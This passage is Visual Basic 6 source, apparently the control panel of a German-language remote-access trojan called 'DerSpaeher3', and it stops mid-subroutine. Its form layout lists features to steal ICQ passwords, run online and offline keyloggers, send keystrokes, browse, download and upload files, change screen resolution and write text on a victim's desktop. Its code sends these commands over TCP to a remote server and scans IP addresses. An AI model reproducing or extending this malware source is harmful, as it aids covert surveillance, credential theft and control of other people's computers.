         BackStyle       =   0  'Transparent
         Caption         =   "get online list"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   5
         Left            =   240
         TabIndex        =   368
         Top             =   2160
         Width           =   1815
      End
      Begin VB.Label lblICQ 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "get full owner"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   4
         Left            =   4080
         TabIndex        =   367
         Top             =   1080
         Width           =   1695
      End
      Begin VB.Label lblICQ 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "find out ICQ nickname"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   3
         Left            =   240
         TabIndex        =   366
         Top             =   1440
         Width           =   2535
      End
      Begin VB.Label lblICQ 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "steal ICQ password(s)"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   0
         Left            =   240
         TabIndex        =   362
         Top             =   720
         Width           =   2535
      End
      Begin VB.Label lblICQ 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "find out ICQ UIN number"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   1
         Left            =   240
         TabIndex        =   364
         Top             =   1080
         Width           =   2775
      End
      Begin VB.Label Label40 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "ICQ"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   3075
         TabIndex        =   363
         Top             =   0
         Width           =   795
      End
      Begin VB.Label lblICQ 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "close ICQ"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   2
         Left            =   240
         TabIndex        =   361
         Top             =   1800
         Width           =   1095
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   38
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   12
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   142
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lblSounds 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "system question"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   0
         Left            =   2550
         TabIndex        =   148
         Top             =   960
         Width           =   1800
      End
      Begin VB.Label Label10 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "PLAY SOUNDS"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2070
         TabIndex        =   147
         Top             =   0
         Width           =   2835
      End
      Begin VB.Label lblSounds 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "system hand"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   3
         Left            =   2805
         TabIndex        =   146
         Top             =   2760
         Width           =   1320
      End
      Begin VB.Label lblSounds 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "system default"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   4
         Left            =   2640
         TabIndex        =   145
         Top             =   3360
         Width           =   1695
      End
      Begin VB.Label lblSounds 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "system exclamation"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   1
         Left            =   2370
         TabIndex        =   144
         Top             =   1560
         Width           =   2175
      End
      Begin VB.Label lblSounds 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "system asterisk"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   2
         Left            =   2580
         TabIndex        =   143
         Top             =   2160
         Width           =   1800
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   13
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   28
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   250
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lblTastatur 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "offline keylogger"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   270
         Index           =   2
         Left            =   2190
         TabIndex        =   321
         Top             =   2760
         Width           =   2565
      End
      Begin VB.Label lblTastatur 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "send keys"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   270
         Index           =   1
         Left            =   2805
         TabIndex        =   253
         Top             =   1560
         Width           =   1365
      End
      Begin VB.Label Label26 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "KEYBOARD"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2445
         TabIndex        =   252
         Top             =   0
         Width           =   2055
      End
      Begin VB.Label lblTastatur 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "keylogger"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   270
         Index           =   0
         Left            =   2775
         TabIndex        =   251
         Top             =   2160
         Width           =   1365
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   27
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.Label lblErgebnis 
      Alignment       =   1  'Right Justify
      BackStyle       =   0  'Transparent
      Caption         =   "Nicht Verbunden"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404000&
      Height          =   210
      Left            =   3360
      TabIndex        =   208
      Top             =   5115
      Visible         =   0   'False
      Width           =   6015
   End
   Begin VB.Label lblZeit 
      Alignment       =   1  'Right Justify
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "10"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404000&
      Height          =   210
      Left            =   2880
      TabIndex        =   36
      Top             =   5115
      Width           =   210
   End
   Begin VB.Shape shpUmrandungStatus 
      BorderColor     =   &H00404040&
      Height          =   240
      Index           =   1
      Left            =   2700
      Top             =   5115
      Width           =   615
   End
   Begin VB.Shape shpUmrandungStatus 
      BorderColor     =   &H00404040&
      Height          =   240
      Index           =   0
      Left            =   2700
      Top             =   5115
      Width           =   7095
   End
   Begin VB.Label lblStatus 
      Alignment       =   1  'Right Justify
      BackStyle       =   0  'Transparent
      Caption         =   "not connected"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404000&
      Height          =   210
      Left            =   3240
      TabIndex        =   34
      Top             =   5115
      Width           =   6135
   End
   Begin VB.Shape shpLampe 
      BackColor       =   &H000000FF&
      BackStyle       =   1  'Opaque
      Height          =   135
      Left            =   9600
      Shape           =   3  'Circle
      Top             =   5160
      Width           =   135
   End
   Begin VB.Shape shpRahmen 
      BackColor       =   &H00C0C000&
      BorderColor     =   &H00C0C000&
      FillColor       =   &H00C0C000&
      Height          =   5130
      Index           =   0
      Left            =   2640
      Top             =   360
      Width           =   7215
   End
End
Attribute VB_Name = "DerSpaeher"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueExString Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Private Declare Function RegQueryValueExLong Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Long, lpcbData As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegQueryValueExNULL Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As Long, lpcbData As Long) As Long
Private Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function FlashWindow Lib "user32" (ByVal hWnd As Long, ByVal bInvert As Long) As Long
Private Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Integer, ByVal X As Integer, ByVal Y As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal hSrcDC As Integer, ByVal XSrc As Integer, ByVal YSrc As Integer, ByVal dwRop As Long) As Integer
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Private Declare Function SetForegroundWindow Lib "user32" (ByVal hWnd As Long) As Long
Private Declare Function GetDC Lib "user32" (ByVal hWnd As Long) As Long
#If Win32 Then
Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As Any, ByVal uFlags As Long) As Long
#Else
Private Declare Function sndPlaySound Lib "MMSYSTEM.DLL" (ByVal lpszSoundName As Any, ByVal wFlags As Integer) As Integer
#End If
Const SND_ASYNC = &H1
Const SND_NODEFAULT = &H2
Const SND_MEMORY = &H4
Dim SoundBuffer As String
Public WasSenden
Dim iVersion As Long
Const ERROR_SUCCESS = 0&
Const APINULL = 0&
Const HKEY_LOCAL_MACHINE = &H80000002
Const SRCCOPY = &HCC0020
Const SRCAND = &H8800C6
Const SRCINVERT = &H660046
Const HKEY_CLASSES_ROOT = &H80000000
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_USERS = &H80000003
Const SWP_NOMOVE = 2
Const SWP_NOSIZE = 1
Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2
Const FLOAT = 1, SINK = 0
Const EWX_FORCE = 4
Const EWX_LOGOFF = 0
Const VK_MENU = &H12
Const KEYEVENTF_KEYUP = &H2
Const EWX_REBOOT = 2
Const EWX_SHUTDOWN = 1
Const ERROR_NO_MORE_ITEMS = 259&
Const REG_NONE = 0
Const REG_SZ = 1
Const SWP_SHOWWINDOW = &H40
Const SWP_HIDEWINDOW = &H80
Const REG_EXPAND_SZ = 2
Const REG_BINARY = 3
Const REG_DWORD = 4
Const ERROR_NONE = 0
Const KEY_ALL_ACCESS = &H3F
Const HEKY_USERS = &H80000003
Const HKEY_QUERY_VALUE = &H1
Const GW_HWNDFIRST = 0
Const GW_HWNDNEXT = 2
Const GWL_STYLE = (-16)
Const Win_VISIBLE = &H10000000
Const Win_BORDER = &H800000
Const WM_LBUTTONDBLCLICK = &H203
Const WM_RBUTTONUP = &H205
Const WM_MOUSEMOVE = &H200
Const NIM_ADD = &H0
Const NIM_MODIFY = &H1
Const NIM_DELETE = &H2
Const NIF_MESSAGE = &H1
Const NIF_ICON = &H2
Const NIF_TIP = &H4
Const EM_GETFIRSTVISIBLELINE = &HCE
Const EM_GETLINE = &HC4
Const EM_GETLINECOUNT = &HBA
Const SW_SHOWNORMAL = 1
Private Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public ErsteD As Boolean
Public ZweiteD As Boolean
Public txtOBJ
Public Soo As Integer
Public RenDatei
Public HinterGrundFarbe
Public KopieDatei
Public DateiGroesse
Public TastaturUeberwachung As Boolean
Public NeueDatei
Public DaW
Public FO
Public AnzahlDerZeilenVonAlleFenster As Integer
Public FO2
Public Senden As Boolean
Public LaufwerkAktiv As Boolean
Public Verbunden
Public Beenden As Boolean
Public Server
Public Uebsilon As Integer
Public DKBV As Boolean
Public MOMEV As Boolean
Public DownLoadVerzeichniss
Public SpyJaNein As Boolean
Public AnzahlDerLabels As Integer
Public AnzahlDerFunktionsLabels As Integer
Public DateiData As String
Public lblUNT As Integer
Public WichtigG As String
Public Soo2 As Integer
Public DateiTyp
Public DateiZumSenden
Public WasWurdeG As String
Dim StillSearching As Boolean
Dim StillSearching2 As Boolean
Const MAXPORT = 80
Public BHJ
Public ICQPad As String
Public DateiZumBeenden
Public DateiName
Public MomentanesVerzeichnis
Public PortMomentan As Long
Public PortJaNein As Boolean
Public PortAnzahl As Long
Public Laufwerk As Boolean
Public IPScanStatus As Integer
Dim Response As String, Reply As Integer, DateNow As String
Dim first As String, Second As String, Third As String
Dim Fourth As String, Fifth As String, Sixth As String
Dim Seventh As String, Eighth As String
Dim Start As Single, Tmr As Single
Dim a As Integer
Dim SendingFile As Boolean
Dim AbortFile As Boolean
Dim RecievedFile As String
Dim BeginTransfer As Single
Dim m_sLineString As String * 1056
Dim m_lngRet As Long
Dim m_sRetString As String
Public frmLinks As Long
Public frmOben As Long
Public AnzahllblAuswahl As Integer
Public tfServer As Boolean
Public tfClient As Boolean
Public tfDatei As Boolean
Public IndexVonText As Integer
Public IPScanWert
Public shpNormalFarbe
Public GruenAnzahl As Integer
Public tfFun As Boolean
Public IPZahlMomentan As Integer
Public tfMeldung As Boolean
Public tfErweitert As Boolean
Public ZZahl As Long
Public Zeichen As String
Public tfSonstiges As Boolean
Public shpFarbe
Public PicAnzeigen As Integer
Public lblFunktionenAnzahl As Integer
Public ZwischenWert
Public lblAuswahlSchriftFarbe
Public lblAuswahlSchriftFarbeUnaktiv
Public Datei
Public ServerBinaer As String
Public BeendenJaNein As Boolean

Sub frmEinstellungen()
On Error Resume Next
Option12.Value = True
Option9.Value = True
Option7.Value = True
List5.Text = "HKEY_LOCAL_MACHINE\"
portr.Close
portr.LocalPort = 2004
portr.Listen
List3.Text = "system-path"
List4.Text = "system-path"
List3.ToolTipText = List3.Text
List4.ToolTipText = List4.ToolTipText

Option7.Value = True
Option10.Value = True
TastaturUeberwachung = False
Option5.Value = True
Option3.Value = True
DateiGroesse = "0"
optAuswahl(0).Value = True
GruenAnzahl = 45
ipscanner(0).RemotePort = 2002
BeendenJaNein = False

txttextfelder(9).Text = tcp1.LocalIP
Option2.Value = True
DerSpaeher.Width = "10050"
DerSpaeher.Height = "5625"
Dim indx As Integer
For indx = 0 To lblFunktionenAnzahl
If lblFunktionen(indx).ForeColor = &HFFFFC0 Then GoTo u
lblFunktionen(indx).ForeColor = &HFFFFC0

u:
Next
lblFunktionenAnzahl = 27
PicAnzeigen = 6
lblAuswahlSchriftFarbeUnaktiv = vbWhite
lblAuswahlSchriftFarbe = &HFFFF80
For indx = 0 To 6
shpButton(indx).BorderColor = &HC0C000
shpButton(indx).FillColor = &H808000
Next
For indx = 0 To PicAnzeigen
picFunktionen(indx).Visible = False
picFunktionen(indx).BackColor = vbBlack
Next
shpFarbe = &H808000

shpNormalFarbe = &H404000
tfServer = False
tfClient = False
tfDatei = False
tfFun = False
tfMeldung = False
tfErweitert = False
tfSonstiges = False
imgMinimieren.Width = "240"
imgSchliessen.Width = "240"
AnzahllblAuswahl = 9
WertlblBeschriftung = 40
End Sub

Private Sub Dir1_Change()
File1.Path = Dir1.Path
End Sub

Private Sub Drive1_Change()
Dir1.Path = Drive1.Drive
End Sub

Private Sub File1_Click()
Datei = Dir1.Path & "\" & File1.Filename
End Sub

Private Sub Command1_Click()
Picture2.Visible = True
Picture1.Visible = False
End Sub

Private Sub Command2_Click()
Picture2.Visible = False
Picture1.Visible = False
Picture4.Visible = True
End Sub

Private Sub Command3_Click()
Picture2.Visible = True
Picture1.Visible = False
Picture4.Visible = False
End Sub

Private Sub Command4_Click()
Picture2.Visible = False
Picture1.Visible = True
Picture4.Visible = False
End Sub

Private Sub form_load()

DerSpaeher.Height = DerSpaeher.Height
frmEinstellungen
AusgangsStellung
NotizAbrufen

End Sub

Sub NotizAbrufen()
On Error GoTo z
txttextfelder(12).Text = GetSetting("DerSpaeher3", "Notiz", "Notiz")
Exit Sub
z:
End Sub
Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
Dim indx As Integer
For indx = 0 To AnzahllblAuswahl
lblAuswahl(indx).ForeColor = lblAuswahlSchriftFarbeUnaktiv
Next
For indx = 0 To lblFunktionenAnzahl

lblFunktionen(indx).ForeColor = lblAuswahlSchriftFarbe

z:
Next
End Sub


Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    m_bDoEffect = False
StillSearching = False
StillSearching2 = False
End Sub

Private Sub Form_Resize()
If DerSpaeher.WindowState = 1 Then
DerSpaeher.Caption = "DerSpaeher3"
ElseIf DerSpaeher.WindowState = 0 Then
DerSpaeher.Caption = ""
DerSpaeher.Width = "10050"
DerSpaeher.Height = "5625"
Else
DerSpaeher.Caption = ""
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
   Set icq = Nothing
 Set cdl = Nothing
 For Each Socket In TcpWho
        Socket.Close
        Unload Socket
    Next
For Each Socket In tcp
        Socket.Close
        Unload Socket
    Next
For Each Socket In ipscanner
        Socket.Close
        Unload Socket
    Next

tcp1.Close
wskserver.Close
wskclient.Close
Dim Form As Form
   For Each Form In Forms
   Set Form = Nothing
Next Form
End Sub
Sub AllesEntladen()
On Error Resume Next
 m_bDoEffect = False
Dim Socket As Variant
For Each Socket In tcp
Socket.Close
If (Socket.Index <> 0) Then Unload Socket
Next
    For Each Socket In ipscanner
        Socket.Close
        Unload Socket
    Next
Timer5.Enabled = False
End Sub

Private Sub Image1_Click()
DateiOeffnen
IndexVonText = 0
End Sub

Private Sub Image2_Click()
DateiOeffnen
IndexVonText = 7
End Sub

Private Sub imgMinimieren_Click()
DerSpaeher.WindowState = 1
End Sub

Private Sub imgSchliessen_Click()
Dim Form As Form
   For Each Form In Forms
   Unload Form
   Set Form = Nothing
Next Form
End Sub

Private Sub Label47_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Label47.ForeColor = &HC0C000 Then Exit Sub
Label47.ForeColor = &HC0C000
End Sub

Private Sub lblAkOp_Click(Index As Integer)
On Error GoTo z
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then
Exit Sub
Else
End If
If Index = 0 Then
If txttextfelder(23).Text = "" Then
Dialog "and the path??? come on...", "OK"
Exit Sub
Else
End If
DerSpaeher.WasSenden = "BildAnzeigenJetzt": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 1 Then
If txttextfelder(23).Text = "" Then
Dialog "and the path??? come on...", "OK"
Exit Sub
Else
End If
DerSpaeher.WasSenden = "SoundAbspielenJetzt": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "Beep": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 3 Then
If txttextfelder(23).Text = "" Then
Dialog "yes, yes! and which text???", "OK"
Exit Sub
Else
End If
DerSpaeher.WasSenden = "TextAmDesktop": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
End If
BW
Exit Sub
z:
KeineVerbindung
End Sub

Private Sub lblAkOp_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblAkOp(Index).ForeColor = &HFFFF00 Then
Exit Sub
Else
End If
Dim indx As Integer
For indx = 0 To 3
lblAkOp(indx).ForeColor = &HC0C000
Next
lblAkOp(Index).ForeColor = &HFFFF00
End Sub

Private Sub lblAufl_Click(Index As Integer)
On Error GoTo z
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then
Exit Sub
Else
End If
If Index = 0 Then
DerSpaeher.WasSenden = "SechsHundert": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "AchtHundert": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "Tausend": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 3 Then
DerSpaeher.WasSenden = "TausendZwei": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 4 Then
DerSpaeher.WasSenden = "TausendSechs": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
Else
End If
Exit Sub
z:
KeineVerbindung
End Sub

Private Sub lblAufl_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblAufl(Index).ForeColor = &HC0C000 Then
Exit Sub
Else
End If
Dim indx As Integer
For indx = 0 To 4
lblAufl(indx).ForeColor = &H404000
Next
lblAufl(Index).ForeColor = &HC0C000
End Sub

Private Sub lblAuswahl_Click(Index As Integer)
On Error GoTo z
If Index = 0 Then
If tfServer = False Then
tfEinstellungen
ServerStellung
tfServer = True
Else
AusgangsStellung
End If
ElseIf Index = 1 Then
If tfClient = False Then
tfEinstellungen
ClientStellung
tfClient = True
Else
AusgangsStellung
End If
ElseIf Index = 2 Then
If tfDatei = False Then
tfEinstellungen
DateiStellung
tfDatei = True
Else
AusgangsStellung
End If
ElseIf Index = 3 Then
If tfFun = False Then
tfEinstellungen
FunStellung
tfFun = True
Else
AusgangsStellung
End If
ElseIf Index = 4 Then
If tfMeldung = False Then
tfEinstellungen
MeldungStellung
tfMeldung = True
Else
AusgangsStellung
End If
ElseIf Index = 5 Then
If tfErweitert = False Then
tfEinstellungen
ErweitertStellung
tfErweitert = True
Else
AusgangsStellung
End If
ElseIf Index = 6 Then
If tfSonstiges = False Then
tfEinstellungen
SonstigesStellung
tfSonstiges = True
Else
AusgangsStellung
End If
ElseIf Index = 7 Then
StartURL "http://derspaeher.cjb.net"
ElseIf Index = 8 Then
StartURL "mailto:Ghostmann1@gmx.at"
ElseIf Index = 9 Then
Load frmTextEffect
frmTextEffect.Show
Else
End If
Exit Sub
z:
End Sub

Private Sub lblAuswahl_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If lblAuswahl(Index).ForeColor = lblAuswahlSchriftFarbe Then
Exit Sub
Else
End If
Dim indx As Integer
For indx = 0 To AnzahllblAuswahl
lblAuswahl(indx).ForeColor = lblAuswahlSchriftFarbeUnaktiv
Next
lblAuswahl(Index).ForeColor = lblAuswahlSchriftFarbe
For indx = 0 To lblFunktionenAnzahl
If lblFunktionen(indx).ForeColor = &HFFFFC0 Then GoTo u
lblFunktionen(indx).ForeColor = &HFFFFC0
u:
Next
End Sub


Private Sub lblDateiF_Click(Index As Integer)
On Error GoTo z
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then
Exit Sub
Else
End If
If Index = 0 Then
Action.Text = "DateiManager"
DerSpaeher.WasSenden = "DateiManager": InsStatus: tcp1.SendData DerSpaeher.WasSenden
LaufwerkAktiv = True
Laufwerk = True

ElseIf Index = 1 Then
DownLoadVerzeichniss = CurDir & "\"
DerSpaeher.WasSenden = "DateiDownloaden": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "DateiUpLoaden": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 3 Then
DerSpaeher.WasSenden = "DownUpAbbrechenWirklich": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 4 Then
DerSpaeher.WasSenden = "DAnzeigen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 5 Then
DerSpaeher.WasSenden = "KopieDatei": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 6 Then
